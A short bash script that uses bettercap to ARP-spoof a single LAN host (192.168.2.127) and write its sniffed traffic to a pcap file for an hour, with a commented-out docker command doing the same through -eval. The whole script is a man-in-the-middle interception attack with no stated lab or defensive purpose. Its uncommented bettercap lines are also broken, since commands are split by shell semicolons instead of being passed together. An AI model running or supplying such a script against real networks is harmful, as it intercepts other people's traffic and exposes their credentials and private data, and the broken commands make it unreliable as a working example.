#!/bin/bash
set +x
mkdir data/bettercap

go install github.com/bettercap/bettercap@v2

bettercap caplets.update
bettercap set.arp.spoof.targets 192.168.2.127; arp.spoof on
bettercap set net.sniff.output /usr/src/app/data/bettercap/snif.pcap; set net.sniff.local true
bettercap net.sniff on


sleep 60m

#docker run -it --privileged --network=host -v=/data:/data/bettercap bettercap/bettercap -eval "set arp.spoof.targets 192.168.2.127; arp.spoof on; set net.sniff.output /data/bettercap/snif_command.pcap; set net.sniff.local true; net.sniff on;"
